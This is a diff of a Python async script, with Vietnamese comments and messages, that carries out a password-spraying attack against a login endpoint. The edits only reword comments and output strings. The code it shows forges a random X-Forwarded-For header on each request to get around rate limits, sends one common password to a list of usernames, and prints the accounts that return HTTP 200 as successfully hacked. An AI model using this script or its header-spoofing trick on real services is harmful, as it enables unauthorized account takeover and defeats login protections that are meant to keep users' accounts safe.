@@ -18,7 +18,7 @@ def prepare_target_file():
 async def fetch(session, username, password):
     payload = {"username": username, "password": password}
     
-    # Sinh IP ngẫu nhiên cho MỖI request để lách Rate Limit
+    # Sinh IP ngẫu nhiên cho request để lách Rate Limit
     fake_ip = f"10.0.{random.randint(1, 255)}.{random.randint(1, 255)}"
     headers = {"X-Forwarded-For": fake_ip} 
     
@@ -26,7 +26,7 @@ async def fetch(session, username, password):
         return response.status, username
 
 async def main():
-    print("🚀 BẮT ĐẦU CHIẾN DỊCH PASSWORD SPRAYING 🚀")
+    print("🚀 BẮT ĐẦU PASSWORD SPRAYING ATTACK 🚀")
     prepare_target_file() # Mồi sẵn list mục tiêu
     
     with open(TARGET_FILE, "r") as f:
@@ -56,12 +56,12 @@ async def main():
     print("📊 KẾT QUẢ HTTP CODE:")
     for status, count in status_counts.items():
         if status == 200:
-            print(f"  🔥 CODE 200 (HACK THÀNH CÔNG): {count} tài khoản bị lộ mật khẩu!")
+            print(f"  🔥 HACK THÀNH CÔNG: {count} tài khoản bị lộ mật khẩu!")
         else:
             print(f"  - Code {status}: {count} lượt")
             
     if success_accounts:
-        print("\n[+] Trích xuất 5 tài khoản xui xẻo đầu tiên:")
+        print("\n[+] Trích xuất 5 tài khoản đầu tiên:")
         for acc in success_accounts[:5]:
             print(f"    -> {acc} : {COMMON_PASSWORD}")
 
